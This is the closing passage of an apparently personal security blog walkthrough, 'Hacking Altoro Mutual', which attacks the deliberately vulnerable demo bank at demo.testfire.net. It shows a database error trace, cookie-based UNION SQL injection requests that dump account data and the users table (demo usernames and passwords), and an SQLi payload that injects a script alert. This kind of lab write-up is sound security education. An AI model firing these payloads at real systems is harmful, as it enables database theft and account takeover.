System.Data.OleDb.OleDbException: Syntax error in string in query expression 'userid = 1''. at System.Data.OleDb.OleDbCommand.ExecuteCommandTextErrorHandling(OleDbHResult hr) at System.Data.OleDb.OleDbCommand.ExecuteCommandTextForSingleResult(tagDBPARAMS dbParams, Object&amp; executeResult) at System.Data.OleDb.OleDbCommand.ExecuteCommandText(Object&amp; executeResult) at System.Data.OleDb.OleDbCommand.ExecuteCommand(CommandBehavior behavior, Object&amp; executeResult) at System.Data.OleDb.OleDbCommand.ExecuteReaderInternal(CommandBehavior behavior, String method) at System.Data.OleDb.OleDbCommand.ExecuteReader(CommandBehavior behavior) at System.Data.OleDb.OleDbCommand.System.Data.IDbCommand.ExecuteReader(CommandBehavior behavior) at System.Data.Common.DbDataAdapter.FillInternal(DataSet dataset, DataTable[] datatables, Int32 startRecord, Int32 maxRecords, String srcTable, IDbCommand command, CommandBehavior behavior) at System.Data.Common.DbDataAdapter.Fill(DataSet dataSet, Int32 startRecord, Int32 maxRecords, String srcTable, IDbCommand command, CommandBehavior behavior) at System.Data.Common.DbDataAdapter.Fill(DataSet dataSet, String srcTable) at Altoro.Default.GetAccounts(String userId) in d:downloadsAltoroMutual_v6websiteankmain.aspx.cs:line 54 at Altoro.Default.Page_Load(Object sender, EventArgs e) in d:downloadsAltoroMutual_v6websiteankmain.aspx.cs:line 31 at System.Web.Util.CalliHelper.EventArgFunctionCaller(IntPtr fp, Object o, Object t, EventArgs e) at System.Web.Util.CalliEventHandlerDelegateProxy.Callback(Object sender, EventArgs e) at System.Web.UI.Control.OnLoad(EventArgs e) at System.Web.UI.Control.LoadRecursive() at System.Web.UI.Page.ProcessRequestMain(Boolean includeStagesBeforeAsyncPoint, Boolean includeStagesAfterAsyncPoint)
</pre>
<p><a href="http://static.dornea.nu/img/2013/b1026f72d91a1a47e093af15e154b71d.png" title="attachment:main_sql_injection.png"><img alt="SQL Injection" class="img-responsive" height="580" src="http://static.dornea.nu/img/2013/b1026f72d91a1a47e093af15e154b71d.png" title="attachment:main_sql_injection.png" width="NaN"/></a></p>
<p>Ahhh, there we go!Â <strong>Another SQL injection vulnerability!</strong>Â You could now dump some data:</p>
<p> </p>
<pre>#!highlight html 
GET /bank/main.aspx HTTP/1.1
Host: demo.testfire.net
...
amUserInfo=UserName=YWRtaW4=&amp;Password;=YWRtaW4=; amUserId=2 union select accountid, acct_type from accounts;--
</pre>
<p><a href="http://static.dornea.nu/img/2013/89e21aed3343e3512a8eb6267ea8b7bf.png" title="attachment:main_sql_injection2.png"><img alt="SQL Injection" class="img-responsive" height="578" src="http://static.dornea.nu/img/2013/89e21aed3343e3512a8eb6267ea8b7bf.png" title="attachment:main_sql_injection2.png" width="NaN"/></a></p>
<p>You could use this vulnerability toÂ <strong>dump theÂ <em>users</em>Â table</strong>:</p>
<pre>GET /bank/main.aspx HTTP/1.1
Host: demo.testfire.net
...
amUserInfo=UserName=YWRtaW4=&amp;Password;=YWRtaW4=; amUserId=2 union select username, password from users;--
</pre>
<p>This will return:</p>
<pre>admin admin
cclay Ali
jsmith Demo1234
sjoe frazier
sspeed Demo1234
tuser tuser
</pre>
<p>Simple, isn’t it? <img alt=":-D" class="wp-smiley img-responsive" src="http://dornea.nu/wp-includes/images/smilies/icon_biggrin.gif"/> </p>
<p> </p>
<h3 id="126fccae2356602cff581a01152f34e7"><span id="XSS_using_cookie_data">XSS using cookie data</span></h3>
<p>Alternatively you could combine SQLi with XSS:</p>
<pre>#!highlight html 
GET /bank/main.aspx HTTP/1.1
Host: demo.testfire.net
...
amUserInfo=UserName=YWRtaW4=&amp;Password;=YWRtaW4=; amUserId=2 union select "&lt;script&gt;alert(1234)&lt;/script&gt;", "Injection FOUND!" from accounts;--
</pre>
<p><a href="http://static.dornea.nu/img/2013/fe65a05f2bc5e5ec889f64f81e9f007e.png" title="attachment:main_sql_injection_with_xss.png"><img alt="SQL Injection" class="img-responsive" height="581" src="http://static.dornea.nu/img/2013/fe65a05f2bc5e5ec889f64f81e9f007e.png" title="attachment:main_sql_injection_with_xss.png" width="NaN"/></a></p>
                </div>
<hr/>
<div style="float:left;">
	Prev: <a href="../../../../2013/05/02/overthewire-vortex-level1" align='left'>
	 OverTheWire: Vortex Level1
	</a>
</div>
<div style="float:right;">
    Next: <a href="../../../../2013/05/17/introducing-links-of-the-week-low-1" align='right'>
	 Introducing Links of the Week (LOW) #1
	</a>
</div>
</p>

                <!-- Add comments -->
<div id="content-comments">
    <div id="disqus_thread"></div>
    <script type="text/javascript">
        var disqus_shortname="dorneanu";
				var disqus_identifier = 'hacking-altoro-mutual';
			var disqus_url = '../../../../2013/05/06/hacking-altoro-mutual';

		var disqus_config = function () {
			this.language = "en";
		};
 
        
        (function(){var a=document.createElement("script");a.type="text/javascript";a.async=true;a.src="//"+disqus_shortname+".disqus.com/embed.js";(document.getElementsByTagName("head")[0]||document.getElementsByTagName("body")[0]).appendChild(a)})();</script>
    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
</div> 
            </div>
            <div class="niu2-right-container col-md-2">
                <div id="niu2-sidebar-meta" class="niu2-sidebar">
                    <div class="niu2-sidebar-label"><i class="icon-calendar"></i>Published:</div>
                    <div class="niu2-sidebar-value">2013-05-06 00:00</div>
                    <div class="niu2-sidebar-label"><i class="icon-pencil"></i>category:</div>
                    <div class="niu2-sidebar-value"><a href="../../../../category/blog">blog</a></div>
                    <div class="niu2-sidebar-label"><i class="icon-tag"></i>Tag:</div>
                    <div class="niu2-sidebar-inter-value niu2-sidebar-tag"><a href="../../../../tag/hacking/">hacking</a><sup>20</sup></div>
                    <div class="niu2-sidebar-inter-value niu2-sidebar-tag"><a href="../../../../tag/security/">security</a><sup>29</sup></div>
                    <div class="niu2-sidebar-inter-value niu2-sidebar-tag"><a href="../../../../tag/wargames/">wargames</a><sup>7</sup></div>
                    <div class="niu2-sidebar-inter-value niu2-sidebar-tag"><a href="../../../../tag/web/">web</a><sup>13</sup></div>
                    <div class="niu2-sidebar-inter-value niu2-sidebar-tag"><a href="../../../../tag/appsec/">appsec</a><sup>15</sup></div>
                </div>

                <div id="niu2-sidebar-toc" class="niu2-sidebar" data-status="closed">
                    <div class="niu2-sidebar-label">
                        <i id="niu2-sidebar-toc-ctrl" class="icon-open-tocs"></i>Table of contents
                    </div>
                    <ul id="niu2-sidebar-toc-list">
                        <li><a href="#content-heading">Hacking Altoro Mutual</a></li>
                        <li><a href='#3d259698b7b1fa955b8b4bfd78c184d3'>IntroductionÂ </a></li><li><a href='#5aa530919b62444243ee30a0ef52aee1'>Vulnerabilities by URL</a><ul><li><a href='#765f6e48248fbc7c4d9648b544f5e5c6'>/default.aspx?content=</a></li><li><a href='#0b6275b4fd4340d418195012eb027c55'>/bank</a></li><li><a href='#65497bf7a464b98772b9026e8870b752'>/bank/login.aspx</a><ul><li><a href='#c6c7fb86f055418b430d443a7f425228'>Brute force vulnerability</a></li><li><a href='#1893267eeefa97c21a09c4e6d7d15585'>SQL injection using POST parameters</a></li><li><a href='#67cf80dbb18aadf77119f4a4f5cb98ab'>Base64-encoded login credentials</a></li></ul></li><li><a href='#3b289266841a38499874d73cf76dea4c'>/bank/main.aspxÂ </a><ul><li><a href='#7dfe4e77b9ff513418fef8297c5f792a'>Source code disclosure</a></li><li><a href='#7b966d041c9c404fa4d83013a8280060'>SQL injection using Cookie data</a></li><li><a href='#126fccae2356602cff581a01152f34e7'>XSS using cookie data</a></li></ul></li></ul></li>
                        <li><a href="#content-comments">Comments</a></li>
                    </ul>
                </div>
            </div>
            <div id="niu2-toolbar">
                <ul class="list-unstyled">
                    <li><a id="niu2-toolbar-ctrlsidebar" href="#" title="Hide Sidebar"><i class="icon-3x icon-hide-sidebar"></i></a></li>
                </ul>
                <div id="niu2-toolbar-showsidebar" data-title="Show Sidebar"></div>
                <div id="niu2-toolbar-github" data-repo=""></div>
                <div id="niu2-toolbar-bitbucket" data-repo=""></div>
            </div>
            <div id="niu2-toc" data-style="fixed"></div>
        </div>

        <div class="niu2-footer">
            <div id="body-footer" class="col-md-6 col-md-offset-2">
                <hr/>
                <p>
                    Powered by <a href="https://github.com/getpelican/pelican">Pelican</a>, 
                    <a href="https://github.com/mawenbao/niu-x2-sidebar">theme</a> built with <a href="https://github.com/twbs/bootstrap">Bootstrap3</a>
                    by <a href="https://blog.mawenbao.com">Ma Wenbao</a>, icons by 
                    <a href="https://fortawesome.github.io/Font-Awesome">Font Awesome</a>.
                </p>
                <p>
                    © 2008 - 2016
                    <a class="niu2-footer-link" href="../../../..">Victor Dorneanu</a>
                </p>
                <p class="niu2-icons">
                    <a class="niu2-footer-icon" href="https://pgp.mit.edu/pks/lookup?op=get&search=0x18F1AD46FB05E1B7" title="my public key">
                        <i class="icon-key icon-lg"></i>
                    </a>
                    <a class="niu2-footer-icon" href="mailto: no-spam ÄATT dornea DOT nu" title="my email address">
                        <i class="icon-envelope-o icon-lg"></i>
                    </a>
                    <a class="niu2-footer-icon" href="http://github.com/dorneanu" title="my github page">
                        <i class="icon-github-alt icon-lg"></i>
                    </a>
                    <a class="niu2-footer-icon" href="/feeds/rss.xml" title="subscribe my blog">
                        <i class="icon-rss icon-lg"></i>
                    </a>
                </p>
            </div>
        </div>

        <script type="text/javascript">
            var _gaq=_gaq||[];
            _gaq.push(["_setAccount","UA-7161767-3"]);
            _gaq.push(["_trackPageview"]);
            (function(){
                var b=document.createElement("script");
                b.type="text/javascript";
                b.async=true;
                b.src=("https:"==document.location.protocol?"https://ssl":"http://www")+".google-analytics.com/ga.js";
                var a=document.getElementsByTagName("script")[0];
                a.parentNode.insertBefore(b,a)
            })();
        </script>
        <div id="niu2-pygments" data-theme="github"></div>
        <div id="niu2-lazy-load" data-loading-txt="Loading image" data-loading-icon="icon-spin icon-spinner"></div>
        <div id="niu2-toolbar-load" data-loading-icon="icon-spin icon-4x icon-spinner"></div>
        <script type="text/javascript" src="../../../../theme/js/jquery-1.11.0.min.js"></script>
        <script type="text/javascript" src="../../../../theme/js/niu2.min.js"></script>
        <script type="text/javascript" src="../../../../theme/js/bootstrap.min.js"></script>
        <script type="text/javascript" src="/js/custom.js"></script>
        <script type="text/javascript">
            onContentLoaded();
        </script>
    </body>
</html>